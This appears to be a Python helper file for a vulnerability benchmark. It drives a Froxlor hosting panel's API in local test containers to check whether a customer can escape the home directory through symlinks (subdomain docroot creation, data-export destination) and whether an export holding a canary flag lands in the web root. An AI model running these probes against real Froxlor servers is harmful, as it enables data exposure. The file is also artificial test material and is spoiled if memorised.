#!/usr/bin/env python3
"""Shared plumbing for froxlor-cve-2026-41231 (customer-homedir symlink escape).

Both probes drive the REAL Froxlor JSON-RPC-ish API (POST api.php with HTTP Basic auth,
customer key pcbkey:pcbsecret) and then run the REAL froxlor cron (`froxlor:cron --force`)
inside the container, which executes the real Apache config cron (seed: docroot
creation) and the real ExportCron (residual: data export job).

seed:     SubDomains.add(path="pcbseed/newout") where $HOMEDIR/pcbseed is a symlink to
          the web root /var/www/html/seedout. On v0 (2.0.11) the path passes the
          unchecked makeCorrectDir, the Apache cron creates /seedout/newout/ (+index.html)
          -> HTTP 200. On v1 (2.3.5) makeCorrectDir(..., $fixed_homedir) throws
          "Found symlink pointing outside of customer home directory" -> 404.
residual: DataDump.add(path="dumps", dump_web=1) where $HOMEDIR/dumps is a symlink to
          /var/www/html/dumpout. On v1 the destdir is not checked for symlinks, the
          ExportCron writes <loginname>-export_<ts>.tar.gz (containing the customer
          docroot incl. the canary flag.txt) into the web root -> downloadable via HTTP.
          On v2 (2.3.6) makeCorrectDir(..., $customer['documentroot']) throws -> no file.
"""
import base64
import gzip
import io
import json
import subprocess
import tarfile
import urllib.request
import urllib.error

FLAG = "pcbflag"  # injected by oracle
APP_HOST = {"v0": 41830, "v1": 41831, "v2": 41832}
CONTAINER = {"v0": "pcb-froxlor-sym-v0", "v1": "pcb-froxlor-sym-v1", "v2": "pcb-froxlor-sym-v2"}
API_KEY = "pcbkey"
API_SECRET = "pcbsecret"
DUMPOUT = "/var/www/html/dumpout"
SEEDOUT_URL = "/seedout/newout/"
DOMAIN = "pcb.local"


def api_call(version, command, params):
    """POST api.php -> returns (http_status, response_text)."""
    port = APP_HOST[version]
    payload = json.dumps({"command": command, "params": params}).encode()
    auth = base64.b64encode(f"{API_KEY}:{API_SECRET}".encode()).decode()
    req = urllib.request.Request(
        f"http://127.0.0.1:{port}/api.php", data=payload, method="POST",
        headers={"Content-Type": "application/json", "Authorization": f"Basic {auth}"},
    )
    try:
        with urllib.request.urlopen(req, timeout=30) as r:
            return r.status, r.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("utf-8", "replace")
    except Exception as e:
        return 0, str(e)


def http_get(version, path):
    """Plain HTTP GET on the app's docroot."""
    port = APP_HOST[version]
    try:
        with urllib.request.urlopen(f"http://127.0.0.1:{port}{path}", timeout=30) as r:
            return r.status, r.read()
    except urllib.error.HTTPError as e:
        return e.code, e.read()
    except Exception as e:
        return 0, str(e).encode()


def docker_exec(version, *args):
    return subprocess.run(
        ["docker", "exec", CONTAINER[version], *args],
        capture_output=True, text=True, timeout=180,
    )


def run_full_cron(version):
    """Real froxlor cron: 'export' (DataDump job) + 'tasks' (REBUILD_VHOST -> Apache
    docroot creation, REBUILD_DNS, etc.). On 2.0.11 the 'export' module does not exist
    and is skipped with a warning while 'tasks' still runs."""
    r = docker_exec(version, "php", "/var/www/html/bin/froxlor-cli", "froxlor:cron", "export", "tasks", "--force")
    return r.returncode


def seed_probe(version, flag):
    """SubDomains.add with a symlink-escaped docroot path; observe /seedout/newout/."""
    status, api_body = api_call(version, "SubDomains.add", {
        "domain": DOMAIN, "subdomain": "seed1", "path": "pcbseed/newout",
    })
    run_full_cron(version)
    http_status, body = http_get(version, SEEDOUT_URL)
    return {"ok": http_status == 200, "status": http_status, "api_status": status,
            "api_body": api_body[:160], "body": f"http_get_status={http_status}"}


def _extract_flag_from_export(version, flag) -> str:
    """List the web-root dump dir, download the newest export tar.gz, extract flag.txt."""
    r = docker_exec(version, "ls", "-t", DUMPOUT)
    files = [f for f in (r.stdout or "").splitlines() if f.endswith(".tar.gz")]
    if not files:
        return ""
    name = files[0]
    status, data = http_get(version, f"/dumpout/{name}")
    if status != 200 or not data:
        return ""
    try:
        outer = tarfile.open(fileobj=io.BytesIO(data), mode="r:gz")
        for member in outer.getmembers():
            if member.name.endswith("-web.tar.gz"):
                inner = gzip.decompress(outer.extractfile(member).read())
                inner_tar = tarfile.open(fileobj=io.BytesIO(inner), mode="r:")
                for m2 in inner_tar.getmembers():
                    if m2.name.endswith("/flag.txt") or m2.name == "flag.txt":
                        return inner_tar.extractfile(m2).read().decode("utf-8", "replace")
    except Exception:
        return ""
    return ""


def residual_probe(version, flag):
    """DataDump.add with a symlink-escaped destination; observe the export file."""
    status, api_body = api_call(version, "DataDump.add", {
        "path": "dumps", "dump_dbs": "0", "dump_mail": "0", "dump_web": "1",
    })
    run_full_cron(version)
    txt = _extract_flag_from_export(version, flag)
    return {"ok": flag in txt, "status": status, "body": txt, "api_body": api_body[:160]}
